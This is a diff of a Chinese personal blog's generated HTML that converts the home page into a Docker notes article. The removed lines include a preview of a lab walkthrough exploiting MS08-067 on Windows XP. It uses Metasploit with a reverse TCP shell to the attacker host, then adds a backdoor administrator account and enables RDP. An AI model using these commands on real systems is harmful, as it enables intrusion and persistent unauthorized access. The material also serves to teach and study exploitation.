@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>XccitのBlog</title>
+    <title>Docker基础笔记 | XccitのBlog</title>
     <meta name="author" content="CH_ywx" />
     <meta name="description" content="贩卖温柔のselling kindness" />
     <meta name="keywords" content="" />
@@ -42,7 +42,9 @@
 
 
 
-<script src="/js/lib/home.js"></script>
+
+
+
 
 <link rel="stylesheet" href="/css/main.css" />
 
@@ -152,40 +154,11 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="home-head">
-    <div
-        id="home-background"
-        ref="homeBackground"
-        data-images="/images/background.jpg"
-    ></div>
-    <div id="home-info" @click="homeClick">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>XccitのBlog</h1>
-                <h3>Hello World</h3>
-                <h5>贩卖温柔のselling kindness</h5>
-            </div>
-        </span>
+            <div class="article">
+    <div>
+        <h1>Docker基础笔记</h1>
     </div>
-</div>
-<div
-    id="home-posts-wrap"
-    ref="homePostsWrap"
-    true
->
-    <div id="home-posts">
-        
-
-<div class="post">
-    <a href="/2024/07/13/Docker%E7%AC%94%E8%AE%B0/">
-        <h2 class="post-title">Docker基础笔记</h2>
-    </a>
-    <div class="category-and-date">
-        
+    <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
@@ -194,11 +167,25 @@
         </span>
         
         
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
             
-            <h1 id="Docker笔记"><a href="#Docker笔记" class="headerlink" title="Docker笔记"></a>Docker笔记</h1><h2 id="1-系统准备"><a href="#1-系统准备" class="headerlink" title="1.系统准备"></a>1.系统准备</h2><h3 id="1-1配置网络"><a href="#1-1配置网络" class="headerlink" title="1.1配置网络"></a>1.1配置网络</h3><h3 id="1-2yum包更新到最新"><a href="#1-2yum包更新到最新" class="headerlink" title="1.2yum包更新到最新"></a>1.2yum包更新到最新</h3><blockquote>
+            
+            <span class="tag">
+                
+                <a href="/tags/docker/" style="color: #ffa2c4">
+                    docker
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="Docker笔记"><a href="#Docker笔记" class="headerlink" title="Docker笔记"></a>Docker笔记</h1><h2 id="1-系统准备"><a href="#1-系统准备" class="headerlink" title="1.系统准备"></a>1.系统准备</h2><h3 id="1-1配置网络"><a href="#1-1配置网络" class="headerlink" title="1.1配置网络"></a>1.1配置网络</h3><h3 id="1-2yum包更新到最新"><a href="#1-2yum包更新到最新" class="headerlink" title="1.2yum包更新到最新"></a>1.2yum包更新到最新</h3><blockquote>
 <p>yum update</p>
 </blockquote>
 <h3 id="1-3安装依赖的软件包"><a href="#1-3安装依赖的软件包" class="headerlink" title="1.3安装依赖的软件包"></a>1.3安装依赖的软件包</h3><blockquote>
@@ -456,223 +443,13 @@ docker run -d -p 6379:6379 --restart=always \
 redis-server /etc/redis/config/redis.conf
 </code></pre>
 
-            
-        </div>
     </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/docker/" style="color: #ff7d73">docker</a>
-        </span>
-        
-    </div>
-    <a href="/2024/07/13/Docker%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
-        <h2 class="post-title">MS08-067漏洞利用</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/7/12
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="MS08-067漏洞利用"><a href="#MS08-067漏洞利用" class="headerlink" title="MS08-067漏洞利用"></a>MS08-067漏洞利用</h1><p>目标机器:192.168.1.7 Windows XP</p>
-<p>攻击机:192.168.1.12 Kali</p>
-<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><pre><code class="nmap">nmap -O -T4 -p445 -sV --script smb-vuln-ms08-067 192.168.1.7
-</code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408140441521.png" alt="image-20210408140441521"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="nmap">service postgresql start
-msfconsole
-search 08-067
-use exploit/windows/smb/ms08_067_netapi
-show options
-set rhosts 192.168.1.7
-set payload windows/shell/reverse_tcp
-set lhost 192.168.1.12
-exploit
-</code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408140542782.png" alt="image-20210408140542782"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408141354688.png" alt="image-20210408141354688"></p>
-<p><strong>exploit</strong>命令执行后就成功利用漏洞进入了windows系统</p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408141816252.png" alt="image-20210408141816252"></p>
-<p>进入windows系统后执行以下命令，新建用户方便进入winows系统</p>
-<pre><code class="shell">net user hacker 123456 /add      hacker:用户名 123456:密码
-net localhost administrators hacker /add  hacker:用户名    --将hacker用户添加至管理员组
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  开启3389端口
-</code></pre>
-<p>而后kali新打开一个shell窗口，输入以下命令进行远控登录:</p>
-<pre><code class="shell">rdesktop 192.168.1.7
-</code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408142450690.png" alt="image-20210408142450690"></p>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20210408142515324.png" alt="image-20210408142515324"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E4%BF%A1%E5%AE%89/" style="color: #00a596">信安</a>
-        </span>
-        
-    </div>
-    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/">
-        <h2 class="post-title">SpringBoot项目开启数据源加密</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/7/12
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="SpringBoot实现数据源加密"><a href="#SpringBoot实现数据源加密" class="headerlink" title="SpringBoot实现数据源加密"></a>SpringBoot实现数据源加密</h1><h2 id="1-为什么要进行数据源加密"><a href="#1-为什么要进行数据源加密" class="headerlink" title="1.为什么要进行数据源加密?"></a>1.为什么要进行数据源加密?</h2><blockquote>
-<p>项目测试阶段,较为严苛的公司一般都需要进行数据源加密,特别是一些特殊部门的外包项目,测试文档中对数据源加密的测试流程很严格,不然会在项目被反编译时暴露数据源信息。</p>
-</blockquote>
-<h2 id="2-如何进行数据源加密"><a href="#2-如何进行数据源加密" class="headerlink" title="2.如何进行数据源加密?"></a>2.如何进行数据源加密?</h2><h3 id="2-1-使用jasypt"><a href="#2-1-使用jasypt" class="headerlink" title="2.1 使用jasypt"></a>2.1 使用jasypt</h3><blockquote>
-<p>实现数据源加密的方式有很多,以jasypt为例</p>
-</blockquote>
-<h4 id="2-1-1-引入jar"><a href="#2-1-1-引入jar" class="headerlink" title="2.1.1 引入jar"></a>2.1.1 引入jar</h4><blockquote>
-<p>我们创建一个工程,引入jar信息:</p>
-</blockquote>
-<pre><code class="xml">        &lt;dependency&gt;
-            &lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt;
-            &lt;artifactId&gt;jasypt-spring-boot-starter&lt;/artifactId&gt;
-            &lt;version&gt;3.0.5&lt;/version&gt;
-        &lt;/dependency&gt;
-</code></pre>
-<h4 id="2-1-2-配置加密信息"><a href="#2-1-2-配置加密信息" class="headerlink" title="2.1.2 配置加密信息"></a>2.1.2 配置加密信息</h4><blockquote>
-<p>以SpringBoot工程为例,在yml或properties配置文件中配置如下信息:</p>
-</blockquote>
-<pre><code class="yaml"># 数据源加密
-jasypt:
-  encryptor:
-    password: $&#123;PASSWORD&#125;
-    algorithm: PBEWithHMACSHA512AndAES_256
-</code></pre>
-<h4 id="2-1-3-编写测试类"><a href="#2-1-3-编写测试类" class="headerlink" title="2.1.3 编写测试类"></a>2.1.3 编写测试类</h4><pre><code class="java">/**
- * @author CH_ywx
- * @version 1.0
- * @create 2024/6/9
- * &lt;p&gt;&lt;/p&gt;
- */
-@SpringBootTest
-public class TestDBAuth &#123;
-
-    @Test
-    public void test()&#123;
-        // PBEWithHMACSHA512AndAES_256加密方式,看配置文件
-        AES256TextEncryptor textEncryptor = new AES256TextEncryptor();
-        textEncryptor.setPassword(&quot;ADMIN&quot;); //参数为加盐的值
-        String myEncryptedText = textEncryptor.encrypt(&quot;Xccit.1209&quot;); //参数为真实密码
-        //加密后的结果
-        System.out.println(myEncryptedText);
-        String plainText = textEncryptor.decrypt(myEncryptedText);
-        //解密后的结果
-        System.out.println(plainText);
-    &#125;
-&#125;
-</code></pre>
-<p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20240712234044350.png" alt="image-20240712234044350"><br>如图,看到输出结果是这样就对了</p>
-<h4 id="2-1-4-重新配置数据源"><a href="#2-1-4-重新配置数据源" class="headerlink" title="2.1.4 重新配置数据源"></a>2.1.4 重新配置数据源</h4><blockquote>
-<p>将加密后的结果按如图配置:<br><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20240712234128978.png" alt="image-20240712234128978"><br>SpringBoot在启动的时候会根据ENC()来判断是否有加密，如果有会根据配置的盐和算法进行解码。</p>
-</blockquote>
-<h4 id="2-1-5-启动时加上环境变量"><a href="#2-1-5-启动时加上环境变量" class="headerlink" title="2.1.5 启动时加上环境变量"></a>2.1.5 启动时加上环境变量</h4><blockquote>
-<p>这里在测试阶段可以使用IDEA加环境变量的方式启动<br><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20240712234156051.png" alt="image-20240712234156051"><br>PASSWORD: jasypt配置中的key<br>ADMIN:测试类中加盐字段的值,必须保持一致,不然数据源密码会解密失败</p>
-</blockquote>
-<blockquote>
-<p>打成jar包后可以使用命令行参数启动:</p>
-</blockquote>
-<pre><code class="shell">java -jar xxx.jar PASSWORD=ADMIN
-</code></pre>
-<h2 id="3-看一下效果"><a href="#3-看一下效果" class="headerlink" title="3.看一下效果"></a>3.看一下效果</h2><p><img src="https://fastly.jsdelivr.net/gh/xccit/xccit.github.io/images_resource/image-20240712234218352.png" alt="image-20240712234218352"></p>
-<p>正常启动,无报错,如果对数据库操作报密码错误,请检查盐值。</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/SpringBoot/" style="color: #03a9f4">SpringBoot</a>
-        </span>
-        
-    </div>
-    <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/" class="go-post">阅读全文</a>
-</div>
-
-
-        <div class="page-current">
     
-    <span class="current">1</span>
     
     
     
     
-</div>
-
-    </div>
     
-    <div id="home-card">
-        <div id="card-style">
-    <div id="card-div">
-        <div class="avatar">
-            <img src="/images/myavatar.jpg" alt="avatar" />
-        </div>
-        <div class="name">CH_ywx</div>
-        <div class="description">
-            <p>贩卖温柔の優しさを振りまく<br>QQ: 1571466236 WECHAT: lucky_all_time_max</p>
-
-        </div>
-        
-        
-    </div>
-</div>
-
-    </div>
     
 </div>
 
@@ -704,6 +481,12 @@ public class TestDBAuth &#123;
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 </body>
 </html>
